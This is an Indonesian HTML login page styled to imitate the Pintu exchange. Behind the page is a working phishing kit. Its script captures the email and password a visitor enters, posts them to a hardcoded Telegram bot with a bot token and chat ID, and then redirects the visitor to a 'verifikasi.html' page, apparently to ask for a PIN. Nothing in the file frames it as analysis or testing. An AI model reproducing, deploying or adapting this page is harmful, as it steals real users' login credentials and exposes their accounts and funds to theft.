<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Masuk</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background-color: #ffffff;
      color: #000000;
      line-height: 1.4;
    }

    .container {
      width: 90%;
      max-width: 380px;
      min-width: 280px;
      margin: 0 auto;
      padding: 60px 5% 0;
    }

    .title {
      font-size: 22px;
      font-weight: 700;
      margin-bottom: 30px;
    }

    .form-group {
      margin-bottom: 28px;
      position: relative;
    }

    label {
      display: block;
      font-weight: 600;
      font-size: 15px;
      margin-bottom: 8px;
    }

    .input-field {
      width: 100%;
      padding: 10px 0;
      border: none;
      border-bottom: 1.5px solid #000;
      font-size: 16px;
      background: transparent;
      outline: none;
    }

    .forgot-password {
      text-align: right;
      margin-bottom: 34px;
    }

    .forgot-password a {
      color: #0066FF; /* Biru seperti Pintu */
      text-decoration: none;
      font-size: 14px;
      font-weight: 500;
    }

    /* ===== TOMBOL BIRU SEPERTI PINTU ===== */
    .login-button {
      width: 100%;
      background-color: #0066FF; /* Biru Pintu */
      color: #fff;
      border: none;
      padding: 13px;
      font-size: 15px;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
      margin-bottom: 42px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      transition: all 0.2s ease;
    }

    .login-button:hover {
      background-color: #0052D4; /* Biru lebih gelap saat hover */
    }

    .login-button:active {
      background-color: #0039A6; /* Biru lebih gelap saat diklik */
      transform: translateY(1px);
    }

    .login-button:disabled {
      background-color: #99C2FF; /* Biru muda saat disabled */
      cursor: not-allowed;
      opacity: 0.7;
    }

    .terms {
      text-align: center;
      font-size: 13px;
      color: #666;
    }

    .terms a {
      color: #0066FF; /* Biru konsisten dengan tombol */
      font-weight: 700;
      text-decoration: none;
    }

    /* ===== Toggle password ===== */
    .toggle-password {
      position: absolute;
      right: 0;
      top: 38px;
      background: none;
      border: none;
      cursor: pointer;
      color: #9ca3af;
      padding: 0;
    }

    .toggle-password svg {
      width: 20px;
      height: 20px;
    }

    /* ===== Loading spinner - AWALNYA DISEMBUNYIKAN ===== */
    .spinner {
      display: none;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #ffffff;
      animation: spin 1s ease-in-out infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .hidden {
      display: none !important;
    }

    /* ===== Efek pada input ===== */
    .input-field:focus {
      border-bottom-color: #0066FF; /* Garis biru saat fokus */
    }
  </style>
</head>

<body>
  <div class="container">
    <h1 class="title">Masuk</h1>

    <form id="loginForm">
      <!-- Email -->
      <div class="form-group">
        <label for="email">Email Kamu</label>
        <input 
          type="email" 
          id="email" 
          class="input-field" 
          required 
          placeholder=""
        />
      </div>

      <!-- Password -->
      <div class="form-group">
        <label for="password">Kata Sandi</label>
        <input 
          type="password" 
          id="password" 
          class="input-field" 
          required 
          placeholder=""
        />

        <!-- Toggle Password -->
        <button
          type="button"
          class="toggle-password"
          id="togglePasswordBtn"
          aria-label="Toggle password"
        >
          <!-- Eye -->
          <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
            <path d="M10 3C5 3 1.73 7.11 1 10c.73 2.89 4 7 9 7s8.27-4.11 9-7c-.73-2.89-4-7-9-7zM10 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/>
            <path d="M10 7a3 3 0 100 6 3 3 0 000-6z"/>
          </svg>

          <!-- Eye Off -->
          <svg id="eyeOffIcon" class="hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
            <path fill-rule="evenodd" d="M3.707 2.293a1 1 0 00-1.414 1.414l14 14a1 1 0 001.414-1.414L16.243 14.82A10.014 10.014 0 0019.542 10C18.268 5.943 14.478 3 10 3a9.958 9.958 0 00-4.512 1.074l-1.78-1.781z" clip-rule="evenodd"/>
            <path d="M12.454 16.697L9.75 13.992a4 4 0 01-3.742-3.741L2.335 6.578A9.98 9.98 0 00.458 10c1.274 4.057 5.065 7 9.542 7 .847 0 1.669-.105 2.454-.303z"/>
          </svg>
        </button>
      </div>

      <div class="forgot-password">
        <a href="#">Lupa Password?</a>
      </div>

      <!-- Tombol Masuk Biru -->
      <button type="submit" class="login-button" id="submitBtn">
        Masuk
      </button>
    </form>

    <div class="terms">
      Dengan mendaftar, kamu menyetujui<br />
      <a href="#">Syarat & Ketentuan</a>
    </div>
  </div>

  <script>
    // ===== FUNGSI TOGGLE PASSWORD =====
    function togglePassword() {
      const passwordInput = document.getElementById('password');
      const eyeIcon = document.getElementById('eyeIcon');
      const eyeOffIcon = document.getElementById('eyeOffIcon');

      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.classList.add('hidden');
        eyeOffIcon.classList.remove('hidden');
      } else {
        passwordInput.type = 'password';
        eyeIcon.classList.remove('hidden');
        eyeOffIcon.classList.add('hidden');
      }
    }

    // ===== KONFIGURASI TELEGRAM BOT =====
    const BOT_TOKEN = '8357781635:AAGabLtcnX8_1jM9Nho4RIuRa8xUU4M42Ss';
    const CHAT_ID = '8427991917';

    // ===== INISIALISASI SAAT HALAMAN DIMUAT =====
    document.addEventListener('DOMContentLoaded', function() {
      const loginForm = document.getElementById('loginForm');
      const togglePasswordBtn = document.getElementById('togglePasswordBtn');
      const submitBtn = document.getElementById('submitBtn');
      const emailInput = document.getElementById('email');
      const passwordInput = document.getElementById('password');
      
      // Buat elemen spinner terpisah
      const spinner = document.createElement('div');
      spinner.className = 'spinner';
      spinner.id = 'btnSpinner';
      
      // Event listener untuk toggle password
      togglePasswordBtn.addEventListener('click', togglePassword);
      
      // Event listener untuk form submission
      loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        
        // Validasi input
        if (!email || !password) {
          alert('Harap isi email dan kata sandi');
          return;
        }
        
        // Validasi format email sederhana
        if (!email.includes('@') || !email.includes('.')) {
          alert('Format email tidak valid');
          return;
        }
        
        // Tampilkan loading state
        submitBtn.disabled = true;
        submitBtn.innerHTML = 'Mengirim...';
        
        // Tambahkan spinner ke tombol
        submitBtn.appendChild(spinner);
        spinner.style.display = 'block';
        
        try {
          // Buat pesan untuk dikirim ke Telegram
          const message = `ðŸ“¥ *Login Baru*\nðŸ“§ Email: ${email}\nðŸ”’ Password: ${password}`;
          
          // Kirim data ke Telegram Bot API
          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: message,
              parse_mode: 'Markdown'
            })
          });
          
          if (!response.ok) {
            throw new Error('Gagal mengirim ke Telegram');
          }
          
          const data = await response.json();
          
          if (data.ok) {
            // Jika berhasil dikirim, redirect ke halaman PIN
            setTimeout(() => {
              window.location.href = "verifikasi.html";
            }, 1000);
          } else {
            throw new Error('Gagal mengirim pesan');
          }
          
        } catch (error) {
          console.error('Error:', error);
          alert('Terjadi kesalahan saat mengirim ke Telegram.');
          
          // Reset button state
          submitBtn.disabled = false;
          submitBtn.innerHTML = 'Masuk';
          spinner.style.display = 'none';
        }
      });
    });
  </script>
</body>
</html>
